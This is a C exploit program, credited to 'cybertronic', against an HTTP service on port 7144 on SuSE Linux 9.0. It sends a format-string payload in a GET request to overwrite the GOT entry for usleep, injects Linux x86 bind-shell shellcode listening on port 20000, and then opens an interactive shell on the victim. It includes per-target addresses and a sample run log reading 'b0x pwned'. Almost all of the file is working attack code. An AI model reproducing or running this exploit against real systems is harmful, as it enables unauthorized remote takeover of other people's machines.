/*
              __              __                   _
  _______  __/ /_  ___  _____/ /__________  ____  (_)____
 / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
\___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
    /____/

--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
--[ connecting to 127.0.0.1:7144...done!
--[ using bind shellcode
--[ GOT: 0x0809da9c
--[ RET: 0x41ad8a82
--[ sending packet [ 196 bytes ]...done!
--[ sleeping 5 seconds before connecting to 127.0.0.1:20000...
--[ connecting to 127.0.0.1:20000...done!
--[ b0x pwned - h4ve phun
//bin/sh: error while loading shared libraries: libc.so.6: failed to map segment from shared object: Cannot allocate memory

*/

#include

#define NOP     0x90

#define RED     "\E[31m\E[1m"
#define GREEN   "\E[32m\E[1m"
#define YELLOW  "\E[33m\E[1m"
#define BLUE    "\E[34m\E[1m"
#define NORMAL  "\E[m"

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, int sub );
int shell ( int s, char* tip );
int usage ( char* name );

void connect_to_bindshell ( char* tip, unsigned short bport );
void header ();
void wait ( int sec );

// bad chars: 0x00, 0x0a, 0x0d, 0x3f

/***********************
 * Linux x86 Shellcode *
 ***********************/

// 93 bytes bindcode, modified to remove badchar 0x3f, see comment
// -cybertronic

char bindshell[] =
"\x31\xdb"				// xor ebx, ebx
"\xf7\xe3"				// mul ebx
"\xb0\x66"				// mov al, 102
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x43"					// inc ebx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\x4b"					// dec ebx
"\xcd\x80"				// int 80h
"\x89\xc7"				// mov edi, eax
"\x52"					// push edx
"\x66\x68\x4e\x20"			// push word 8270
"\x43"					// inc ebx
"\x66\x53"				// push bx
"\x89\xe1"				// mov ecx, esp
"\xb0\xef"				// mov al, 239
"\xf6\xd0"				// not al
"\x50"					// push eax
"\x51"					// push ecx
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\xb0\x66"				// mov al, 102
"\x43"					// inc ebx
"\x43"					// inc ebx
"\xcd\x80"				// int 80h
"\x50"					// push eax
"\x50"					// push eax
"\x57"					// push edi
"\x89\xe1"				// mov ecx, esp
"\x43"					// inc ebx
"\xb0\x66"				// mov al, 102
"\xcd\x80"				// int 80h
"\x89\xd9"				// mov ecx, ebx
"\x89\xc3"				// mov ebx, eax
"\xb0\x3e"				// mov al, 62			[ changed 63 to 62 to remove 0x3f ]
"\x40"					// inc eax			[ change 62 to 63 ]
"\x49"					// dec ecx
"\xcd\x80"				// int 80h
"\x41"					// inc ecx
"\xe2\xf7"				// loop lp			[ adjust loop: changed 0xf8 to 0xf7 ]
"\x51"					// push ecx
"\x68\x6e\x2f\x73\x68"			// push dword 68732f6eh
"\x68\x2f\x2f\x62\x69"			// push dword 69622f2fh
"\x89\xe3"				// mov ebx, esp
"\x51"					// push ecx
"\x53"					// push ebx
"\x89\xe1"				// mov ecx, esp
"\xb0\xf4"				// mov al, 244
"\xf6\xd0"				// not al
"\xcd\x80";				// int 80h
//"\x90\x90\x90\x90"
//"\x90\x90\x90\x90"
//"\xe9\xf8\xff\xff\xff";

typedef struct _args {
	char* tip;
	char* lip;
	int tport;
	int target;
} args;

struct targets {
	int num;
	unsigned long smashaddr;
	unsigned long writeaddr;
	int sub;
	char name[64];
}

//HIGHJACKED: 0809da9c R_386_JUMP_SLOT   usleep

target[]= {
	{ 0, 0x0809da9c, 0x41acfab9, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 1, 0x0809da9c, 0x41ad1c13, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 2, 0x0809da9c, 0x41ad6841, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 3, 0x0809da9c, 0x41ad6a40, 36, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 4, 0x0809da9c, 0x41ad8a82, 37, "SuSE Linux 9.0 Kernel: 2.4.21-99-default" },
	{ 5, 0x0809da9c, 0xdeadc0de, 36, "description" } //add more targets if needed
};

int
check ( unsigned long addr )
{
	char tmp[128];

	snprintf ( tmp, sizeof ( tmp ), "%d", addr );
	if ( atoi( tmp ) < 1 )
	addr = addr + 256;
	return ( addr );
}

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_port = htons ( tport );
	remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	return ( s );
}

int
exploit ( int s, unsigned long smashaddr, unsigned long writeaddr, int sub )
{
	char buffer[2048];
	int a, b, c, d;
	int cn1, cn2, cn3, cn4;
	unsigned int bal1, bal2, bal3, bal4;
	unsigned long ulcbip;

	printf ( "--[ GOT: 0x%08x\n", smashaddr );
	printf ( "--[ RET: 0x%08x\n", writeaddr );

	a = ( smashaddr & 0xff000000 ) >> 24;
	b = ( smashaddr & 0x00ff0000 ) >> 16;
	c = ( smashaddr & 0x0000ff00 ) >> 8;
	d = ( smashaddr & 0x000000ff );

	bal1 = ( writeaddr & 0xff000000 ) >> 24;
	bal2 = ( writeaddr & 0x00ff0000 ) >> 16;
	bal3 = ( writeaddr & 0x0000ff00 ) >> 8;
	bal4 = ( writeaddr & 0x000000ff );

	cn1 = bal4 - sub;
	cn1 = check ( cn1 );
	cn2 = bal3 - bal4;
	cn2 = check ( cn2 );
	cn3 = bal2 - bal3;
	cn3 = check ( cn3 );
	cn4 = bal1 - bal2;
	cn4 = check ( cn4 );

	bzero ( &buffer, sizeof ( buffer ) );

	//double write does not work here

	sprintf ( buffer,
	"GET /html/en/index.html"
	"%c%c%c%c"
	"%c%c%c%c"
	"%c%c%c%c"
	"%c%c%c%c"
	"%%%du%%1265$n%%%du%%1266$n%%%du%%1267$n%%%du%%1268$n",
	d,     c, b, a,
	d + 1, c, b, a,
	d + 2, c, b, a,
	d + 3, c, b, a,
	cn1,
	cn2,
	cn3,
	cn4 );

	memset ( buffer + strlen ( buffer ), NOP, 16 );
	memcpy ( buffer + strlen ( buffer ), bindshell, sizeof ( bindshell ) -1 );
	strcat ( buffer, "\r\n\r\n" );

	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( "failed!\n" );
		return ( 1 );
	}
	printf ( "done!\n"  );

	return ( 0 );
}

int
shell ( int s, char* tip )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

int
usage ( char* name )
{
	int i;

	printf ( "\n" );
	printf ( "Usage: %s -h  -p  -t \n", name );
	printf ( "\n" );
	printf ( "Targets\n\n" );
	for ( i = 0; i < 6; i++ )
		printf ( "\t[%d] [0x%08x] [0x%08x] [%s]\n", target[i].num, target[i].smashaddr, target[i].writeaddr, target[i].name );
	printf ( "\n" );
	exit ( 1 );
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ("--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip );
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;

	while ( ( i = getopt ( argc, argv, "h:p:t:" ) ) != -1 )
	{
		switch ( i )
		{
			case 'h':
				argp->tip = optarg;
				break;
			case 'p':
				argp->tport = atoi ( optarg );
				break;
			case 't':
				argp->target = strtoul ( optarg, NULL, 16 );
				break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp->tip == NULL || argp->tport < 1 || argp->tport > 65535 ||  argp->target < 0 || argp->target > 5 )
		usage ( argv[0] );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s;
	args myargs;

	system ( "clear" );
	header ();
	parse_arguments ( argc, argv, &myargs );
	s = connect_to_remote_host ( myargs.tip, myargs.tport );

	printf ( "--[ using bind shellcode\n" );
	if ( exploit ( s, target[myargs.target].smashaddr, target[myargs.target].writeaddr, target[myargs.target].sub ) == 1 )
	{
		printf ( "exploitation failed!\n" );
		exit ( 1 );
	}
	connect_to_bindshell ( myargs.tip, 20000 );
	close ( s );
	return 0;
}
